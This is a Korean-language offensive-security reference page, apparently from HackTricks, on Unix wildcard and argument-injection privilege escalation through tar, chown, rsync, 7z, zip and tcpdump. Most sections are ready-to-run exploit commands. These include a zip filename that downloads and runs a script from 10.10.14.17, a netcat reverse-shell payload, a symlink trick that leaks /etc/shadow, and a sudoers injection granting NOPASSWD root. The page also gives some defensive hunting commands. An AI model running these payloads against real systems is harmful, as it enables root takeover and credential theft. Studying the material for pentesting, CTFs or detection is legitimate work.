# Wildcards Spare Tricks

> Wildcard(또는 *glob*) **argument injection**은 권한이 있는 script가 `*`처럼 따옴표로 묶이지 않은 wildcard를 사용해 `tar`, `chown`, `rsync`, `zip`, `7z` 등의 Unix binary를 실행할 때 발생합니다.
> Shell은 binary를 실행하기 **전에** wildcard를 확장하므로, 작업 디렉터리에 파일을 생성할 수 있는 attacker는 `-`로 시작하는 filename을 만들어 해당 filename이 **data가 아닌 option으로** 해석되도록 할 수 있습니다. 이를 통해 임의의 flag나 심지어 command까지 효과적으로 몰래 전달할 수 있습니다.<sup>[[6]](#references)</sup>
> 이 페이지에서는 2023-2025년의 가장 유용한 primitive, 최신 research 및 modern detection을 정리합니다.

## chown / chmod

Wildcard로 option처럼 보이는 filename이 확장될 때 `--reference` flag를 악용하면 **reference file의 owner/group 또는 permission bit를 복사**할 수 있습니다.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```
root가 나중에 다음과 같은 것을 실행하면:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
확장된 `--reference=.drf.php`는 명시된 owner/mode를 재정의하여, 일치하는 파일이 `.drf.php`의 metadata를 상속하도록 합니다(그리고 위 설정에서는 해당 파일을 attacker가 write할 수 있게 만듭니다).<sup>[[6]](#references)</sup>

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).<sup>[[7]](#references)</sup>  
자세한 내용은 classic DefenseCode paper도 참고하세요.<sup>[[6]](#references)</sup>

---

## tar

### GNU tar

GNU tar의 **checkpoint** feature와 checkpoint actions를 악용하여 arbitrary commands를 실행합니다.<sup>[[10]](#references)</sup>
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```
root가 예를 들어 `tar -czf /root/backup.tgz *`를 실행하면 `shell.sh`가 root 권한으로 실행됩니다.<sup>[[10]](#references)</sup>

### bsdtar / macOS compressor override 시 주의 사항

최근 macOS의 기본 `tar`(`libarchive` 기반)는 GNU tar의 `--checkpoint` 인터페이스를 제공하지 않지만, bsdtar는 외부 compressor를 선택하기 위한 **--use-compress-program**을 문서화하고 있습니다.<sup>[[11]](#references)</sup>
```bash
# macOS example
touch -- "--use-compress-program=sh"
```
권한이 높은 script가 `tar -cf backup.tar *`를 실행하면, 이는 피해자의 `PATH`를 통해 `sh`를 선택하고 bsdtar는 이를 compressor로 실행합니다.<sup>[[11]](#references)</sup> 이는 option injection을 입증하지만, 그 자체만으로 신뢰할 수 있는 arbitrary-command primitive인 것은 아닙니다. wildcard로 생성된 파일 이름에는 `/`를 포함할 수 없으며, bsdtar는 공격자가 선택한 shell command가 아니라 archive data를 제공합니다. Code execution을 수행하려면 `PATH`를 통해 확인되는 제어 가능한 executable 또는 유용한 program의 이름을 지정할 수 있는 다른 argument channel이 추가로 필요합니다.

---

## rsync

`rsync`를 사용하면 `-e` 및 `--rsync-path`와 같은 command-line flags를 통해 remote shell 또는 remote binary를 override할 수 있습니다.<sup>[[12]](#references)</sup>
```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
root가 나중에 `rsync -az * backup:/srv/`로 디렉터리를 archive하면, 주입된 flag를 통해 remote-shell mechanism으로 shell을 실행할 수 있습니다.<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

권한이 있는 script가 option parsing을 막기 위해 wildcard 앞에 `--`를 *방어적으로* 추가하더라도, 7-Zip CLI는 파일 이름 앞에 `@`를 붙여 **file list files**를 허용합니다. 여기에 symlink를 결합하면 *임의의 파일을 exfiltrate*할 수 있습니다.<sup>[[13]](#references)</sup>
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
root가 다음과 같은 명령을 실행하면:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip은 `root.txt` (→ `/etc/shadow`)을 파일 목록으로 읽으려 시도하고 중단되며, **내용을 stderr에 출력합니다**.<sup>[[13]](#references)</sup>

이는 `-- *`에서도 동작합니다. 7-Zip CLI가 일반 파일 이름과 `@listfiles`를 모두 positional input으로 명시적으로 허용하므로, `@root.txt`와 같은 literal filename도 여전히 특별하게 처리됩니다.<sup>[[13]](#references)</sup>

---

## zip

애플리케이션이 사용자 제어 파일 이름을 `zip`에 전달할 때(와일드카드를 사용하거나 `--` 없이 이름을 열거하는 경우) 매우 실용적인 두 가지 primitive가 존재합니다.<sup>[[2]](#references)[[3]](#references)</sup>

- RCE via test hook: `-T`는 “test archive”를 활성화하고 `-TT <cmd>`는 tester를 임의의 프로그램으로 대체합니다(long form: `--unzip-command <cmd>`). `-`로 시작하는 파일 이름을 주입할 수 있다면, short-options parsing이 동작하도록 플래그를 서로 다른 파일 이름으로 나누십시오.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Notes
- `'-T -TT <cmd>'`와 같은 단일 filename을 시도하지 마세요. short options는 문자별로 파싱되므로 실패합니다. 아래와 같이 별도의 token을 사용하세요.<sup>[[3]](#references)</sup>
- 앱이 filename에서 슬래시를 제거한다면, bare host/IP에서 가져오세요(기본 경로 `/index.html`). 그런 다음 `-O`를 사용해 로컬에 저장하고 실행하세요.<sup>[[3]](#references)</sup>
- `-sc`(처리된 argv 표시) 또는 `-h2`(추가 도움말)를 사용해 parsing을 debug하면 token이 어떻게 소비되는지 확인할 수 있습니다.<sup>[[3]](#references)</sup>

zip 3.0에서의 local 동작 예시입니다.<sup>[[3]](#references)</sup>
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: 웹 layer가 `zip` stdout/stderr를 echo하는 경우(naive wrapper에서 흔함), `--help` 같은 injected flag 또는 잘못된 option으로 인한 failure가 HTTP response에 노출되어 command-line injection을 확인하고 payload tuning을 지원합니다.<sup>[[3]](#references)</sup>

---

## Additional option-injection candidates

privileged wrapper가 wildcard를 사용해 writable directory를 확장할 때, 다음과 같이 문서화된 option hook을 확인할 가치가 있습니다.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `flock` | `-c <cmd>` | shell에 command string 전달 |
| `git`   | `-c core.sshCommand=<cmd>` | Git fetch/push에 SSH 대신 `<cmd>` 사용 |
| `scp`   | `-S <program>` | 대체 SSH-compatible connection program 사용 |

이러한 primitive는 *tar/rsync/zip* classic 외에도 유용하게 확인할 수 있습니다.

---

## Hunting vulnerable wrappers and jobs

최근 case study와 detection guidance에 따르면 wildcard/argv injection은 더 이상 **cron + tar** 문제에만 국한되지 않습니다.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> 동일한 bug class는 다음에서도 계속 나타납니다.

- attacker-controlled upload directory에서 "download everything as zip/tar"를 제공하는 web feature
- attacker-controlled filename/filter field를 사용하는 **tcpdump** wrapper를 노출하는 vendor/appliance debug shell
- writable directory에서 `tar`, `rsync`, `7z`, `zip`, `chown`, 또는 `chmod`를 호출하는 backup 또는 rotation job

유용한 triage command (`pspy` invocation은 문서화된 process/file-event 및 interval flag를 사용합니다).<sup>[[14]](#references)</sup>
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
빠른 휴리스틱:

- `-- *`는 여러 GNU 도구에서 좋은 해결책이지만, `@listfiles`가 별도로 파싱되는 `7z`/`7za`에는 해당하지 않습니다.<sup>[[13]](#references)</sup>
- `zip`에서는 사용자가 제어하는 파일 이름을 직접 열거하는 wrapper를 찾으세요. shell glob 없이도 short-option splitting (`-T` + `-TT <cmd>`)은 여전히 작동합니다.<sup>[[2]](#references)[[3]](#references)</sup>
- `tcpdump`에서는 **output file names**, **rotation settings** 또는 **capture-file replay** 인자를 제어할 수 있게 하는 wrapper에 특히 주의하세요.<sup>[[18]](#references)</sup>

---

## tcpdump rotation hooks (-G/-W/-z): wrapper의 argv injection을 통한 RCE

제한된 shell 또는 vendor wrapper가 엄격한 quoting/validation 없이 사용자가 제어하는 필드(예: "file name" parameter)를 이어 붙여 `tcpdump` command line을 구성하는 경우, 추가 `tcpdump` flags를 몰래 삽입할 수 있습니다. `-G` (time-based rotation), `-W` (파일 수 제한), `-z <cmd>` (post-rotate command)를 조합하면 `tcpdump`를 실행하는 사용자(어플라이언스에서는 root인 경우가 많음) 권한으로 arbitrary command execution이 가능합니다.<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

사전 조건:

- `tcpdump`에 전달되는 `argv`를 조작할 수 있어야 합니다(예: `/debug/tcpdump --filter=... --file-name=<HERE>`와 같은 wrapper를 통해).<sup>[[4]](#references)[[18]](#references)</sup>
- wrapper가 file name field의 공백 또는 `-`로 시작하는 token을 sanitize하지 않아야 합니다.<sup>[[4]](#references)</sup>

Classic PoC (writable path에서 reverse shell script를 실행합니다).<sup>[[4]](#references)[[18]](#references)</sup>
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
세부 사항:

- `-G 1`은 매초 rotate하며, `-W 1`은 rotate된 파일 하나에서 중지합니다. 캡처가 rotate되기 전에 일치하는 packet을 수신해야 합니다.<sup>[[18]](#references)</sup>
- `-z <cmd>`는 각 rotation마다 post-rotate command를 한 번 실행하고, 닫힌 savefile 경로를 argument로 전달합니다. script/interpreter의 argument handling이 payload와 일치하는지 확인해야 합니다.<sup>[[18]](#references)</sup>

Removable media가 필요 없는 variants:

- 파일을 작성할 수 있는 다른 primitive이 있다면(예: output redirection을 허용하는 별도의 command wrapper), script를 알려진 path에 저장하고 `-z /path/script.sh`를 trigger합니다. 필요한 경우 script 자체에서 `/bin/sh`를 invoke하도록 합니다.<sup>[[18]](#references)</sup>
- vendor wrapper에서 rotated path를 선택할 수 있다면, 해당 path control을 savefile argument를 해석하는 post-rotate command와 함께 사용할 때만 audit해야 합니다. path control만으로는 file contents가 execute되지 않습니다.<sup>[[18]](#references)</sup>

---

## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root

sudoers anti-pattern 예시:<sup>[[3]](#references)</sup>
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
이 규칙에서는 tcpdump의 문서화된 parser를 통해 여러 옵션을 사용할 수 있습니다.<sup>[[3]](#references)[[18]](#references)</sup>
- `*` glob과 허용적인 패턴은 첫 번째 `-w` 인자만 제한합니다. `tcpdump`는 여러 `-w` 옵션을 허용하며, 마지막 옵션이 적용됩니다.<sup>[[3]](#references)[[18]](#references)</sup>
- 이 규칙은 다른 옵션을 제한하지 않으므로 `-Z`, `-r`, `-V` 등을 사용할 수 있습니다.<sup>[[3]](#references)[[18]](#references)</sup>

관련 primitive는 아래에 설명되어 있습니다.<sup>[[3]](#references)[[18]](#references)</sup>
- 두 번째 `-w`를 사용하여 destination path를 재정의합니다(첫 번째 옵션은 sudoers 조건만 충족).<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- 제한된 트리에서 벗어나기 위한 첫 번째 `-w` 내부의 Path traversal.<sup>[[3]](#references)</sup>
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- `-Z root`를 사용해 출력 소유권을 강제합니다(어디서든 root 소유 파일을 생성).<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- `-r`을 통해 조작된 PCAP을 재생하여 임의의 콘텐츠 쓰기(예: sudoers 줄 추가).<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>정확한 ASCII payload를 포함하는 PCAP을 생성하고 root 권한으로 쓰기</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- `-V <file>`을 사용한 임의 파일 읽기/secret leak (savefiles 목록으로 해석). 오류 진단 메시지가 줄을 그대로 출력하는 경우가 많아 내용이 leak될 수 있습니다.<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - 전체 Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Wildcard Injection으로 인한 잠재적 Shell 탐지](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Back To The Future: Unix Wildcards Gone Wild (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [GNU Coreutils `chown` invocation](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [GNU Coreutils `chmod` invocation](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [GNU tar checkpoints](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [bsdtar(1) 매뉴얼](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [rsync(1) 매뉴얼](https://download.samba.org/pub/rsync/rsync.1)
- [13] [7-Zip command line syntax](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [flock(1) 매뉴얼](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Git configuration documentation](https://git-scm.com/docs/git-config)
- [17] [OpenBSD `scp` 매뉴얼](https://man.openbsd.org/scp)
- [18] [tcpdump(8) 매뉴얼](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
